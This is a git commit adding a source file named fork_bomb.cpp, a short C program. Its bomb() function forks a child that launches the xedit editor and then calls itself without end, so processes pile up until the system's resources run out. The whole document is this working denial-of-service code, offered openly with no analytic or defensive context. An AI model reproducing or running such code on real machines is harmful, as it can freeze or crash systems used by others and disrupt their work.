83b1b330e065f0c98db60f5ae2fd4a713a8acdd9
Mahdi <44215423+Mahdi-s@users.noreply.github.com>
2021-09-13 10:26:43 -0500

    Add files via upload

---
+++ fork_bomb.cpp
@@ -0,0 +1,32 @@
+#include <stdio.h>
+#include <unistd.h>
+
+int bomb()
+{
+
+  char* command = "xedit";
+  char* argument_list[] = {"xedit", "", NULL};
+
+
+  if (fork() == 0) {
+
+      int status_code = execvp(command, argument_list);
+
+
+      if (status_code == -1) {
+          printf("Terminated Incorrectly\n");
+          return 1;
+      }
+  }
+
+  return bomb();
+
+}
+
+
+int main() {
+
+    bomb();
+    return 0;
+
+}
